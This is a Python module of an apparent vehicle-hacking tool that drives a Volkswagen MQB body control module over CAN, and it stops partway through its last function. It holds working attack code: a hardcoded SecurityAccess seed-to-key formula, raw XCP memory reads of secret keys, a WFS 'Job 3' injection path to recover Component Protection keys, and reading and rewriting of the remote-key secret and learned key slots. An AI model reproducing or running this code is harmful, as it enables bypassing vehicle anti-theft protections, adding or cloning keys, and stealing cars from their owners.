"""VAG MQB 09 BCM (J519, Continental MPC5607B) live CAN transport, XCP, CP key read/write, and WFS Ch 3 FFB adaptation."""

from __future__ import annotations

from collections.abc import Iterator
import contextlib
from datetime import datetime, timezone
import hashlib
import json
from pathlib import Path
import time
from typing import Any

import can

from contitool.can.transport import (
    BLOCK_SEND_TIMEOUT,
    FRAME_SEND_TIMEOUT,
    P2_STAR_WAIT,
    TRANSPORT_ERRORS,
    J533CanLink,
    UdsNegativeResponse,
    UnexpectedUdsResponse,
)
from contitool.core.bcm import (
    BCM_CP_KEY_TYPE_GFA,
    BCM_CP_KEY_TYPE_IKA,
    BCM_FREQUENCIES,
    BCM_NVM_FFB_COUNTER_BASE_ID,
    BCM_NVM_FFB_KEY_ID,
    BCM_NVM_FFB_SERIAL_BASE_ID,
    BCM_NVM_FFB_SLOT_MASKS_ID,
    BCM_NVM_FFB_SYNC_BASE_ID,
    BCM_UDS_RX_ID,
    BCM_UDS_TX_ID,
    BCM_WFS_RX_ID,
    BCM_WFS_TX_ID,
    BCM_XCP_DD_RX_ID,
    BCM_XCP_DD_TX_ID,
    BCM_XCP_RX_ID,
    BCM_XCP_TX_ID,
    bcm_aes128_ecb_decrypt,
    bcm_build_cp_key_container,
    bcm_build_job3_injection_stages,
    bcm_build_wfs_80_01,
    bcm_build_wfs_80_02,
    bcm_compute_sa_key,
    bcm_decode_status_dids,
    bcm_derive_k_ffb,
    bcm_detect_profile,
    bcm_encrypt_ffb_key_record,
    bcm_extract_cluster_ffb_material,
    bcm_gfa_raw_to_working,
    bcm_recover_ika_from_job3,
)
from contitool.i18n import tr
from contitool.progress import NULL_REPORTER, OperationReporter

BCM_STATUS_DIDS: tuple[int, ...] = (
    0x03DE,  # Component Protection mismatch counter (2 B)
    0x0440,  # Component Protection virgin IKA status (byte 6 bit 0)
    0x043F,  # Component Protection sub-function 0x81/0x82 flags (1 B)
    0x02E0,  # WFS / KS active random challenge (4 B)
    0x02F9,  # KS ODIS key challenge (5 B: 0x81 || RND[4])
    0x0A65,  # RF receiver configuration (7 B: byte 0 = freq code 0x01/0x02/0x04)
    0x1983,  # FFB remote key status (4 B: learned count, active slot, button bits, sync)
    0x24A6,  # Extended FFB receiver diagnostics (6 B)
)

BCM_PASSPORT_DIDS: tuple[tuple[str, int], ...] = (
    ("part_number", 0xF187),
    ("sw_version", 0xF189),
    ("hw_part_number", 0xF191),
    ("hw_version", 0xF1A3),
    ("fazit", 0xF17C),
    ("system_name", 0xF19E),
    ("asam_odx", 0xF19E),
    ("vin", 0xF190),
    ("coding", 0x0600),
)

BCM_KOMFORT_WAKE_FRAMES: tuple[tuple[int, bytes], ...] = (
    (0x17F00010, b"\x10\x00\x07\x00\x01\x00\x00\x00"),  # MQB Komfort CAN NM wake
    (0x3C0, b"\x00\x00\x03\x00"),  # Klemmen_Status_01 (ZAS_Kl_15 = 1)
)


def _norm_key_16b(val: bytes | str, label: str) -> bytes:
    if isinstance(val, (bytes, bytearray, memoryview)):
        raw = bytes(val)
    else:
        cleaned = "".join(str(val).split()).replace("0x", "").replace("0X", "")
        try:
            raw = bytes.fromhex(cleaned)
        except ValueError as exc:
            raise ValueError(f"{label} must be 32 hex digits (16 bytes), got {val!r}") from exc
    if len(raw) != 16:
        raise ValueError(f"{label} must be 16 bytes (32 hex digits), got {len(raw)} bytes")
    return raw


def _clean_ascii(raw: bytes) -> str:
    return "".join(chr(b) for b in raw if 0x20 <= b < 0x7F).strip()


class BcmCanLink(J533CanLink):
    """CAN link for 09 BCM (J519): 11-bit UDS `0x70E/0x778` (DLC=8 `0xAA` pad), 29-bit XCP, and 29-bit WFS Ch 3."""

    UDS_TX_ID = BCM_UDS_TX_ID
    UDS_RX_ID = BCM_UDS_RX_ID

    def __init__(
        self,
        port: str,
        *,
        interface: str = "slcan",
        bitrate: int = 500_000,
        tty_baudrate: int = 115_200,
        listen_only: bool = False,
        log_path: Path | None = None,
        bus: Any | None = None,
        via_gateway: bool = False,
        sw_profile: str | None = None,
    ) -> None:
        super().__init__(
            port,
            interface=interface,
            bitrate=bitrate,
            tty_baudrate=tty_baudrate,
            listen_only=listen_only,
            log_path=log_path,
            bus=bus,
        )
        self.via_gateway = bool(via_gateway)
        self.sw_profile = sw_profile.strip().lower() if sw_profile else None
        self.xcp_tx_id = BCM_XCP_TX_ID
        self.xcp_rx_id = BCM_XCP_RX_ID

    def send_frame(self, identifier: int, data: bytes | bytearray, pad: int | None = 0xAA) -> None:
        raw = bytes(data)
        if pad is not None and len(raw) < 8:
            raw += bytes([pad]) * (8 - len(raw))
        ext = bool(identifier > 0x7FF)
        message = can.Message(arbitration_id=identifier, data=raw, is_extended_id=ext)
        self._write_trace("tx", identifier, message.dlc, raw)
        self.bus.send(message, timeout=FRAME_SEND_TIMEOUT)
        self.tx_frames += 1

    def send_komfort_wake_burst(self) -> None:
        """Broadcast Komfort CAN NM (`0x17F00010`) and KL15 (`0x3C0`) frames to wake BCM on direct Komfort CAN."""
        for arb_id, payload in BCM_KOMFORT_WAKE_FRAMES:
            with contextlib.suppress(*TRANSPORT_ERRORS):
                raw = bytes(payload)
                msg = can.Message(arbitration_id=arb_id, data=raw, is_extended_id=bool(arb_id > 0x7FF))
                self._write_trace("tx", arb_id, msg.dlc, raw)
                self.bus.send(msg, timeout=FRAME_SEND_TIMEOUT)
                self.tx_frames += 1
            time.sleep(0.003)

    def send_isotp_channel(
        self,
        tx_id: int,
        rx_id: int,
        payload: bytes,
        *,
        wait_desc_addr: int | None = None,
        expected_desc_val: int | None = None,
        st_min_floor: float = 0.0,
        timeout: float = 2.0,
    ) -> None:
        """Send an ISO-TP SingleFrame or MultiFrame payload on `(tx_id, rx_id)` with strict 8-byte `0xAA` padding."""
        data = bytes(payload)
        if not data:
            raise ValueError("Empty ISO-TP payload")
        self._maybe_recycle_tx()
        length = len(data)
        if length <= 7:
            self.send_frame(tx_id, bytes([length]) + data, pad=0xAA)
            return

        self.send_frame(
            tx_id,
            bytes([0x10 | ((length >> 8) & 0x0F), length & 0xFF]) + data[:6],
            pad=0xAA,
        )
        offset = 6
        seq = 1
        while offset < length:
            block_size, st_min = self._receive_channel_flow_control(rx_id, timeout=timeout)
            if offset == 6 and wait_desc_addr is not None and expected_desc_val is not None:
                exp_bytes = int(expected_desc_val).to_bytes(4, "big")
                desc_deadline = time.monotonic() + timeout
                while self.xcp_read_memory(wait_desc_addr, 4, timeout=0.6) != exp_bytes:
                    if time.monotonic() >= desc_deadline:
                        raise TimeoutError(
                            f"BCM WFS RX descriptor @ 0x{wait_desc_addr:08X} did not arm to 0x{expected_desc_val:08X}"
                        )
                    time.sleep(0.02)

            delay = max(self._st_min_seconds(st_min), st_min_floor)
            sent_in_block = 0
            while offset < length and (block_size == 0 or sent_in_block < block_size):
                chunk = data[offset : offset + 7]
                self.send_frame(tx_id, bytes([0x20 | (seq & 0x0F)]) + chunk, pad=0xAA)
                seq = (seq + 1) & 0x0F
                offset += len(chunk)
                sent_in_block += 1
                if delay > 0 and offset < length:
                    time.sleep(delay)

    def _receive_channel_flow_control(self, rx_id: int, timeout: float = 2.0) -> tuple[int, int]:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            msg = self.receive_frame(rx_id, timeout=max(0.05, deadline - time.monotonic()))
            raw = bytes(msg.data)
            if not raw:
                continue
            pci_type = raw[0] >> 4
            fc_status = raw[0] & 0x0F
            if pci_type == 3:
                if fc_status == 0:
                    return raw[1] if len(raw) > 1 else 0, raw[2] if len(raw) > 2 else 0
                if fc_status == 1:
                    continue
                raise RuntimeError(f"ISO-TP FlowControl Overflow/Abort from 0x{rx_id:X}: {raw.hex()}")
        raise TimeoutError(f"Timed out waiting for ISO-TP FlowControl from 0x{rx_id:X}")

    def receive_isotp_channel(self, tx_id: int, rx_id: int, timeout: float = 2.0) -> bytes:
        first = self.receive_frame(rx_id, timeout=timeout)
        raw0 = bytes(first.data)
        kind = raw0[0] >> 4
        if kind == 0:
            sf_len = raw0[0] & 0x0F
            return raw0[1 : 1 + sf_len]
        if kind != 1:
            raise RuntimeError(f"Unexpected ISO-TP frame on 0x{rx_id:X}: {raw0.hex()}")
        length = ((raw0[0] & 0x0F) << 8) | raw0[1]
        output = bytearray(raw0[2:])
        self.send_frame(tx_id, b"\x30\x00\x00", pad=0xAA)
        while len(output) < length:
            msg = self.receive_frame(rx_id, timeout=timeout)
            cf = bytes(msg.data)
            if (cf[0] >> 4) != 2:
                raise RuntimeError(f"Expected ISO-TP ConsecutiveFrame on 0x{rx_id:X}, got: {cf.hex()}")
            output.extend(cf[1:])
        return bytes(output[:length])

    def send_uds(self, uds_payload: bytes) -> None:
        self.send_isotp_channel(self.UDS_TX_ID, self.UDS_RX_ID, uds_payload)

    def receive_uds(self, timeout: float = 2.0) -> bytes:
        return self.receive_isotp_channel(self.UDS_TX_ID, self.UDS_RX_ID, timeout=timeout)

    def request_wfs(
        self,
        payload: bytes,
        *,
        expected_first_byte: int | None = 0xC0,
        timeout: float = 3.0,
    ) -> bytes:
        """Send a WFS Channel 3 request on `0x17F8140E` and wait for the `0x17FA0E14` reply."""
        self.drain_rx(quick=True)
        self.send_isotp_channel(BCM_WFS_TX_ID, BCM_WFS_RX_ID, payload, st_min_floor=0.005, timeout=timeout)
        wait = timeout
        while True:
            resp = self.receive_isotp_channel(BCM_WFS_TX_ID, BCM_WFS_RX_ID, timeout=wait)
            if len(resp) >= 3 and resp[0] == 0x7F:
                # WFS Channel 3 (`FUN_000b809c` / `FUN_000b8fda`) emits 4-byte negative/pending replies:
                # `7F 80 <sub_cmd> <NRC>` (e.g. `7F 80 01 78` or `7F 80 02 78` while writing NvM blocks).
                nrc = resp[3] if len(resp) >= 4 else resp[2]
                if nrc == 0x78:
                    wait = max(timeout, P2_STAR_WAIT)
                    continue
            if expected_first_byte is not None and (not resp or resp[0] != expected_first_byte):
                if len(resp) >= 3 and resp[0] == 0x7F:
                    nrc = resp[3] if len(resp) >= 4 else resp[2]
                    raise UdsNegativeResponse(resp[1], nrc, resp)
                raise UnexpectedUdsResponse(
                    f"Unexpected WFS Ch 3 response on 0x{BCM_WFS_RX_ID:08X}: {resp.hex()}"
                )
            return resp

    def xcp_command(
        self,
        cmd: bytes,
        *,
        tx_id: int | None = None,
        rx_id: int | None = None,
        timeout: float = 1.0,
    ) -> bytes:
        """Send an 8-byte ASAM XCP command on `xcp_tx_id` and return the 8-byte reply from `xcp_rx_id`."""
        eff_tx = self.xcp_tx_id if tx_id is None else tx_id
        eff_rx = self.xcp_rx_id if rx_id is None else rx_id
        raw_cmd = bytes(cmd)
        if len(raw_cmd) < 8:
            raw_cmd += b"\x00" * (8 - len(raw_cmd))
        self.send_frame(eff_tx, raw_cmd[:8], pad=0x00)
        msg = self.receive_frame(eff_rx, timeout=timeout)
        return bytes(msg.data)

    def xcp_connect(
        self,
        *,
        profile: dict[str, Any] | None = None,
        timeout: float = 1.0,
    ) -> bytes:
        """Connect to BCM `Vector XcpBasic` agent, automatically probing both EA (`0x1BFC7600`) and DD (`0x1BFC6C00`) IDs."""
        candidates: list[tuple[int, int]] = []
        if profile and "xcp_tx_id" in profile and "xcp_rx_id" in profile:
            candidates.append((int(profile["xcp_tx_id"]), int(profile["xcp_rx_id"])))
        for pair in ((BCM_XCP_TX_ID, BCM_XCP_RX_ID), (BCM_XCP_DD_TX_ID, BCM_XCP_DD_RX_ID)):
            if pair not in candidates:
                candidates.append(pair)

        last_exc: Exception | None = None
        for tx_id, rx_id in candidates:
            try:
                self.drain_rx(quick=True)
                resp = self.xcp_command(b"\xff\x00\x00\x00\x00\x00\x00\x00", tx_id=tx_id, rx_id=rx_id, timeout=timeout)
                if resp and resp[0] == 0xFF:
                    self.xcp_tx_id = tx_id
                    self.xcp_rx_id = rx_id
                    return resp
                last_exc = RuntimeError(f"XCP CONNECT rejected on 0x{tx_id:08X}: {resp.hex()}")
            except TRANSPORT_ERRORS as exc:
                last_exc = exc
        raise RuntimeError(
            tr(
                f"Агент XCP BCM не ответил (проверены 0x1BFC7600 и 0x1BFC6C00): {last_exc}",
                f"BCM XCP agent did not respond (probed 0x1BFC7600 and 0x1BFC6C00): {last_exc}",
            )
        )

    def xcp_read_memory(self, address: int, size: int, *, timeout: float = 1.0) -> bytes:
        """Read `size` bytes from BCM RAM/Flash at `address` using XCP `SHORT_UPLOAD` (`0xF4`)."""
        output = bytearray()
        for offset in range(0, size, 7):
            chunk_len = min(7, size - offset)
            addr = (address + offset) & 0xFFFFFFFF
            cmd = bytes([0xF4, chunk_len, 0x00, 0x00]) + addr.to_bytes(4, "big")
            resp = self.xcp_command(cmd, timeout=timeout)
            if not resp or resp[0] != 0xFF:
                raise RuntimeError(f"XCP SHORT_UPLOAD @ 0x{addr:08X} failed: {resp.hex()}")
            output.extend(resp[1 : 1 + chunk_len])
        return bytes(output)

    def unlock_security_access(self, *, timeout: float = 2.0) -> dict[str, str]:
        """Unlock BCM Application UDS SecurityAccess (`27 03` -> `27 04`, `key = (seed + 0x7A73) & 0xFFFFFFFF`)."""
        seed_resp = self.request_uds(b"\x27\x03", 0x67, timeout=timeout)
        seed = seed_resp[2:6]
        if len(seed) != 4:
            raise RuntimeError(f"Unexpected BCM 27 03 seed response: {seed_resp.hex()}")
        if seed == b"\x00\x00\x00\x00":
            return {"seed_hex": seed.hex(), "key_hex": "00000000", "already_unlocked": "true"}
        key = bcm_compute_sa_key(seed)
        self.request_uds(b"\x27\x04" + key, 0x67, timeout=timeout)
        return {"seed_hex": seed.hex(), "key_hex": key.hex(), "already_unlocked": "false"}

    def read_nvm_block(self, nvm_id: int, *, timeout: float = 2.0) -> bytes:
        """Read a logical NvM block in Development Session (`10 4F`) via `23 12 <nvm_id> 00 00`.

        MPC5607B BCM firmware (`0x0005D4B6` on EA/0511, `0x00059B6C` on DD/0273) replies with:
        `63 12 <nvm_id> <len_hi> <len_lo> <payload[0..len-1]>`.
        """
        req = bytes([0x23, 0x12, nvm_id & 0xFF, 0x00, 0x00])
        resp = self.request_uds(req, 0x63, timeout=timeout)
        if len(resp) >= 5 and resp[1] == 0x12 and resp[2] == (nvm_id & 0xFF):
            pay_len = int.from_bytes(resp[3:5], "big")
            return resp[5 : 5 + pay_len]
        return resp[1:]


@contextlib.contextmanager
def _managed_bcm_session(
    port: str,
    *,
    interface: str = "slcan",
    log_path: Path | None = None,
    bus: Any | None = None,
    via_gateway: bool = False,
    gateway_bridge: bool = False,
    gateway_channel: int = 0,
    needs_raw_komfort: bool = False,
    sw_profile: str | None = None,
    reporter: OperationReporter = NULL_REPORTER,
) -> Iterator[tuple[BcmCanLink, bool]]:
    """Open a `BcmCanLink` over direct Komfort CAN or through J533 Gateway (engaging RAM-Bridge only when 29-bit frames are needed)."""
    if not via_gateway or not needs_raw_komfort:
        with BcmCanLink(
            port,
            interface=interface,
            log_path=log_path,
            bus=bus,
            via_gateway=via_gateway,
            sw_profile=sw_profile,
        ) as link:
            if not via_gateway:
                link.send_komfort_wake_burst()
            yield link, False
        return

    if not gateway_bridge:
        raise RuntimeError(
            tr(
                "Для работы с 29-битными протоколами BCM (XCP / WFS канал 3) через шлюз требуется шлюз "
                "Continental 3Q0 907 530 и адаптер с произвольным raw CAN (CANable / SLCAN / candleLight или "
                "VAS 6154 / VNCI, принимающий в RawMode все идентификаторы) для запуска прозрачного RAM-моста "
                "ch3 ↔ ch0 — либо прямое подключение к шине CAN Komfort.",
                "Working with 29-bit BCM protocols (XCP / WFS Channel 3) through a gateway requires a Continental "
                "3Q0 907 530 gateway and an adapter with arbitrary raw CAN (CANable / SLCAN / candleLight, or a "
                "VAS 6154 / VNCI whose RawMode receives every identifier) for the transparent ch3 ↔ ch0 RAM bridge "
                "— or a direct connection to the Komfort CAN bus.",
            )
        )

    from contitool.can.bridge import j533_can_bridge

    with j533_can_bridge(
        port,
        interface=interface,
        target_channel=gateway_channel,
        log_path=log_path,
        bus=bus,
        reporter=reporter,
    ) as bridge:
        with BcmCanLink(
            port,
            interface=interface,
            log_path=log_path,
            bus=bridge.bus,
            via_gateway=False,
            sw_profile=sw_profile,
        ) as br_link:
            br_link.send_komfort_wake_burst()
            yield br_link, True


def _enter_bcm_diagnostic_session(link: BcmCanLink, session_id: int = 0x03, *, timeout: float = 1.5) -> bool:
    """Enter UDS session `session_id` on BCM, falling back cleanly if `NRC 0x22` requires `10 01` first."""
    for attempt in range(2):
        try:
            link.request_uds(bytes([0x10, session_id & 0xFF]), 0x50, timeout=timeout)
            return True
        except UdsNegativeResponse as exc:
            if exc.nrc == 0x22 and session_id != 0x01 and attempt == 0:
                with contextlib.suppress(*TRANSPORT_ERRORS, UdsNegativeResponse, UnexpectedUdsResponse):
                    link.request_uds(b"\x10\x01", 0x50, timeout=timeout)
                continue
            return False
        except (TimeoutError, can.CanError, UnexpectedUdsResponse):
            if not link.via_gateway and attempt == 0:
                link.send_komfort_wake_burst()
                time.sleep(0.04)
                continue
            return False
    return False


def _read_bcm_passport_in_session(link: BcmCanLink) -> dict[str, Any]:
    """Read standard VAG identification DIDs from `09 BCM`."""
    _enter_bcm_diagnostic_session(link, 0x03, timeout=1.2)
    passport: dict[str, Any] = {}
    for key, did in BCM_PASSPORT_DIDS:
        req = bytes([0x22, (did >> 8) & 0xFF, did & 0xFF])
        try:
            raw = link.request_uds(req, 0x62, timeout=1.2)[3:]
        except (*TRANSPORT_ERRORS, UdsNegativeResponse, UnexpectedUdsResponse):
            continue
        if key == "coding":
            passport["coding_hex"] = raw.hex().upper()
            passport["coding_len"] = len(raw)
        else:
            val = _clean_ascii(raw)
            if val and not passport.get(key):
                passport[key] = val
    return passport


def _is_in_memory_bus(link: BcmCanLink) -> bool:
    """Return True only for synthetic in-memory unit-test buses (`FakeBcmBus`), False for real CAN hardware."""
    return hasattr(link.bus, "rx_queue") and not hasattr(link.bus, "serialPortOrig")


def _read_ffb_slots_via_xcp(
    link: BcmCanLink,
    profile: dict[str, Any],
) -> dict[int, tuple[bytes, bytes, bytes]]:
    """Fallback read of the 7 FFB NvM RAM mirror slots (`Serial`, `Counter`, `Sync`) directly via XCP `SHORT_UPLOAD`."""
    ser_base = profile.get("ffb_serials_addr")
    cnt_base = profile.get("ffb_counters_addr")
    sync_base = profile.get("ffb_syncs_addr")
    if not (ser_base and cnt_base and sync_base):
        return {}
    link.xcp_connect(profile=profile, timeout=1.2)
    ser_blob = link.xcp_read_memory(int(ser_base), 28, timeout=1.5)
    cnt_blob = link.xcp_read_memory(int(cnt_base), 28, timeout=1.5)
    sync_blob = link.xcp_read_memory(int(sync_base), 7, timeout=1.2)
    slots: dict[int, tuple[bytes, bytes, bytes]] = {}
    for idx in range(7):
        slots[idx + 1] = (
            ser_blob[idx * 4 : (idx + 1) * 4],
            cnt_blob[idx * 4 : (idx + 1) * 4],
            sync_blob[idx : idx + 1],
        )
    return slots


def _read_bcm_status_in_session(
    link: BcmCanLink,
    *,
    include_nvm_slots: bool = True,
    profile: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """Read BCM Component Protection & FFB status DIDs (`0x03DE`, `0x0440`, `0x0A65`, `0x1983`, etc.) and optional NvM key slots."""
    _enter_bcm_diagnostic_session(link, 0x03, timeout=1.2)
    raw_dids: dict[int, bytes] = {}
    for did in BCM_STATUS_DIDS:
        req = bytes([0x22, (did >> 8) & 0xFF, did & 0xFF])
        try:
            raw_dids[did] = link.request_uds(req, 0x62, timeout=1.2)[3:]
        except (*TRANSPORT_ERRORS, UdsNegativeResponse, UnexpectedUdsResponse):
            continue

    nvm_slots: dict[int, tuple[bytes, ...]] = {}
    nvm_meta: dict[str, bytes] = {}
    if include_nvm_slots and _enter_bcm_diagnostic_session(link, 0x4F, timeout=1.5):
        try:
            with contextlib.suppress(*TRANSPORT_ERRORS, UdsNegativeResponse, UnexpectedUdsResponse):
                nvm_meta["nvm_03"] = link.read_nvm_block(BCM_NVM_FFB_SLOT_MASKS_ID, timeout=1.5)
            for slot_idx in range(1, 8):
                ser_id = BCM_NVM_FFB_SERIAL_BASE_ID + (slot_idx - 1)
                sync_id = BCM_NVM_FFB_SYNC_BASE_ID + (slot_idx - 1)
                cnt_id = BCM_NVM_FFB_COUNTER_BASE_ID + (slot_idx - 1)
                try:
                    ser_raw = link.read_nvm_block(ser_id, timeout=1.5)
                    cnt_raw = link.read_nvm_block(cnt_id, timeout=1.5)
                    sync_raw = b""
                    with contextlib.suppress(*TRANSPORT_ERRORS, UdsNegativeResponse, UnexpectedUdsResponse):
                        sync_raw = link.read_nvm_block(sync_id, timeout=1.2)
                    nvm_slots[slot_idx] = (ser_raw, cnt_raw, sync_raw)
                except (*TRANSPORT_ERRORS, UdsNegativeResponse, UnexpectedUdsResponse):
                    break
        finally:
            _enter_bcm_diagnostic_session(link, 0x03, timeout=1.2)

    if include_nvm_slots and not nvm_slots and profile is not None and not link.via_gateway:
        with contextlib.suppress(Exception):
            nvm_slots = _read_ffb_slots_via_xcp(link, profile)

    return bcm_decode_status_dids(raw_dids, nvm_slots=nvm_slots or None, nvm_meta=nvm_meta or None)


def _read_bcm_dtcs_in_session(link: BcmCanLink) -> list[dict[str, Any]]:
    """Read and ODIS-decode active and stored DTCs (`UDS 19 02 FF`) inside an active BCM link."""
    from contitool.core import dtc as dtc_mod

    _enter_bcm_diagnostic_session(link, 0x03, timeout=1.2)
    resp = link.request_uds(b"\x19\x02\xff", 0x59, timeout=3.0)
    active_dtcs: list[dict[str, Any]] = []
    stored_dtcs: list[dict[str, Any]] = []
    for off in range(3, len(resp) - 3, 4):
        code = int.from_bytes(resp[off : off + 3], "big")
        status = resp[off + 3]
        grp = dtc_mod.group(status)
        if grp == "untested":
            continue
        disp, desc = dtc_mod.describe_bcm(code)
        entry = {
            "code": f"0x{code:06X}",
            "code_int": code,
            "display": disp,
            "description": desc,
            "status": f"0x{status:02X}",
            "status_text": dtc_mod.status_text(status),
            "group": grp,
            "active": grp == "active",
        }
        if grp == "active":
            active_dtcs.append(entry)
        else:
            stored_dtcs.append(entry)
    return active_dtcs + stored_dtcs


def _hard_reset_and_wait_bcm(
    link: BcmCanLink,
    profile: dict[str, Any] | None = None,
    *,
    timeout: float = 4.5,
) -> bool:
    """Send UDS `11 01` HardReset and wait cleanly past NvM flush + MCU reboot for BCM to reload clean SRAM."""
    sent = False
    with contextlib.suppress(*TRANSPORT_ERRORS, UdsNegativeResponse, UnexpectedUdsResponse):
        link.request_uds(b"\x11\x01", 0x51, timeout=1.5)
        sent = True
    if not sent:
        return False

    fake_bus = _is_in_memory_bus(link)
    # Verified on real 5Q0937084EA hardware: after sending `51 01`, the old firmware stays alive for ~305 ms
    # flushing 5 NvM blocks (and will still answer `10 01` with `50 01`!), then executes MC_ME.MCTL reset
    # (~175 ms offline), then initializes OS / Soft-SHE / CanTp Ch 3 (~150-250 ms).
    if not fake_bus:
        time.sleep(0.85)
        link.drain_rx(max_frames=256, quick=True)

    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if not link.via_gateway:
            link.send_komfort_wake_burst()
        try:
            link.request_uds(b"\x10\x01", 0x50, timeout=0.6)
            if not fake_bus:
                time.sleep(0.20)
                if not link.via_gateway:
                    link.send_komfort_wake_burst()
                link.drain_rx(max_frames=128, quick=True)
            if profile is not None:
                job3_state_addr = int(profile["job3_state_addr"])
                clean_deadline = time.monotonic() + (0.2 if fake_bus else 1.5)
                while time.monotonic() < clean_deadline:
                    try:
                        link.xcp_connect(profile=profile, timeout=0.8)
                        st = link.xcp_read_memory(job3_state_addr, 17, timeout=0.8)
                        if len(st) == 17 and st[1:17] == bytes(16):
                            break
                    except Exception:
                        pass
                    time.sleep(0.01 if fake_bus else 0.12)
            return True
        except (*TRANSPORT_ERRORS, UdsNegativeResponse, UnexpectedUdsResponse):
            time.sleep(0.01 if fake_bus else 0.10)
    return False


def _backup_bcm_ffb_for_read(
    link: BcmCanLink,
    *,
    profile: dict[str, Any] | None = None,
    pre_status: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """Back up `NvM 0x02` (`K_ffb`) and learned FFB slots (`NvM 0x05..0x19`) before sending WFS `80 01 || 00×16`.

    BCM firmware (`0x000C7836..0x000C78EC` on EA/0511) unconditionally overwrites `NvM 0x02` (`K_ffb`) and zeroes
    every learned FFB slot (`NvM 0x05..0x0B`, `0x13..0x19`, `0x0C..0x12`) in DFLASH whenever `80 01` executes.
    """
    status = pre_status
    if status is None or not status.get("rf_0a65_hex") or not status.get("ffb_slots"):
        status = _read_bcm_status_in_session(link, include_nvm_slots=True, profile=profile)

    # If UDS 10 4F did not yield slot contents, try reading the NvM RAM mirror directly via XCP before `80 01` runs.
    if profile is not None and not status.get("ffb_slots"):
        with contextlib.suppress(Exception):
            xcp_slots = _read_ffb_slots_via_xcp(link, profile)
            if xcp_slots:
                freq_code = int(status.get("freq_code", 0x03)) & 0xFF
                synth = bcm_decode_status_dids(
                    {0x0A65: bytes([(freq_code << 1) & 0x06])},
                    nvm_slots=xcp_slots,
                )
                status = {**status, "ffb_slots": synth.get("ffb_slots") or []}

    k_ffb = b""
    if _enter_bcm_diagnostic_session(link, 0x4F, timeout=1.5):
        try:
            with contextlib.suppress(*TRANSPORT_ERRORS, UdsNegativeResponse, UnexpectedUdsResponse):
                raw_02 = link.read_nvm_block(BCM_NVM_FFB_KEY_ID, timeout=1.5)
                if len(raw_02) >= 16:
                    k_ffb = raw_02[:16]
        finally:
            _enter_bcm_diagnostic_session(link, 0x01, timeout=1.2)
    else:
        _enter_bcm_diagnostic_session(link, 0x01, timeout=1.2)

    if len(k_ffb) != 16 and profile is not None and profile.get("ffb_nvm_key_addr"):
        if (not link.via_gateway) or link.gateway_bridge:
            with contextlib.suppress(Exception):
                link.xcp_connect(profile=profile, timeout=1.2)
                raw_xcp_kffb = link.xcp_read_memory(int(profile["ffb_nvm_key_addr"]), 16, timeout=1.2)
                if len(raw_xcp_kffb) == 16:
                    k_ffb = raw_xcp_kffb

    populated_slots = [s for s in (status.get("ffb_slots") or []) if s.get("populated")]
    return {
        "k_ffb": k_ffb,
        "freq_code": int(status.get("freq_code", 0x03)) & 0xFF,
        "populated_slots": populated_slots,
        "status_before": status,
    }


def _restore_bcm_ffb_after_read(
    link: BcmCanLink,
    gfa_working: bytes,
    backup: dict[str, Any],
    *,
    reporter: OperationReporter = NULL_REPORTER,
) -> bool:
    """Restore backed-up `K_ffb` (`80 01`) and learned FFB remote keys (`80 02`) after `80 01 || 00×16` GFA/IKA read."""
    k_ffb = bytes(backup.get("k_ffb") or b"")
    populated_slots = list(backup.get("populated_slots") or [])
    freq_code = int(backup.get("freq_code", 0x03)) & 0xFF

    if len(k_ffb) != 16:
        if populated_slots:
            reporter.warning(
                tr(
                    f"Не удалось прочитать NvM 0x02 (K_ffb) перед чтением GFA — авто-восстановление {len(populated_slots)} "
                    f"радиоключей FFB пропущено; при необходимости адаптируйте их заново.",
                    f"Could not read NvM 0x02 (K_ffb) before GFA read — skipped auto-restore of {len(populated_slots)} "
                    f"FFB key(s); re-adapt them if needed.",
                )
            )
        return False

    zero_dec = bcm_aes128_ecb_decrypt(gfa_working, bytes(16))
    has_real_k_ffb = k_ffb not in (bytes(16), b"\xff" * 16, zero_dec)
    if not populated_slots and not has_real_k_ffb:
        return False

    _enter_bcm_diagnostic_session(link, 0x01, timeout=1.2)
    if not link.via_gateway:
        link.send_komfort_wake_burst()
    link.drain_rx(quick=True)

    pdu_80_01 = bcm_build_wfs_80_01(gfa_working, k_ffb)
    resp1 = link.request_wfs(pdu_80_01, expected_first_byte=0xC0, timeout=3.0)
    if resp1[:2] != b"\xc0\x01":
        reporter.warning(
            tr(
                f"Восстановление K_ffb (80 01) отклонено BCM: {resp1.hex().upper()}",
                f"K_ffb restore (80 01) rejected by BCM: {resp1.hex().upper()}",
            )
        )
        return False

    if populated_slots:
        entries: list[tuple[int, bytes]] = []
        # BCM 80 02 handler (`0x000C795E` on EA/0511) requires sequential 1..N slot indices in the header nibble.
        for seq_idx, sl in enumerate(populated_slots[:7], start=1):
            ser_u32 = int(str(sl["display_id"]), 16)
            cnt_u32 = int(sl.get("rolling_counter", 0))
            cipher = bcm_encrypt_ffb_key_record(
                k_ffb,
                ser_u32,
                rolling_counter=cnt_u32,
                freq_code=freq_code,
            )
            entries.append((seq_idx, cipher))
        pdu_80_02 = bcm_build_wfs_80_02(entries)
        resp2 = link.request_wfs(pdu_80_02, expected_first_byte=0xC0, timeout=3.5)
        if resp2[:2] != b"\xc0\x02":
            reporter.warning(
                tr(
                    f"Восстановление слотов FFB (80 02) отклонено BCM: {resp2.hex().upper()}",
                    f"FFB key slot restore (80 02) rejected by BCM: {resp2.hex().upper()}",
                )
            )
            return False
        if not _is_in_memory_bus(link):
            time.sleep(0.15)
        reporter.info(
            tr(
                f"Сохранены и восстановлены обученные радиоключи FFB ({len(entries)} шт.) и секрет K_ffb (NvM 0x02)",
                f"Preserved and restored {len(entries)} learned FFB key(s) and K_ffb secret (NvM 0x02)",
            )
        )
        return True

    if not _is_in_memory_bus(link):
        time.sleep(0.10)
    reporter.info(
        tr(
            "Восстановлен секрет радиоканала K_ffb (NvM 0x02) после чтения GFA",
            "Restored FFB channel secret K_ffb (NvM 0x02) after GFA read",
        )
    )
    return True


def _read_bcm_job3_target_in_session(
    link: BcmCanLink,
    profile: dict[str, Any],
    *,
    target_addr: int,
    trigger_80_01_pdu: bytes | None = None,
) -> dict[str, Any]:
    """Run one two-stage WFS Job 3 queue pass to read 16-byte RAM at `target_addr` and working `GFA`."""
    _enter_bcm_diagnostic_session(link, 0x01, timeout=1.2)
    if not link.via_gateway:
        link.send_komfort_wake_burst()
    link.drain_rx(quick=True)
    link.xcp_connect(profile=profile, timeout=1.2)

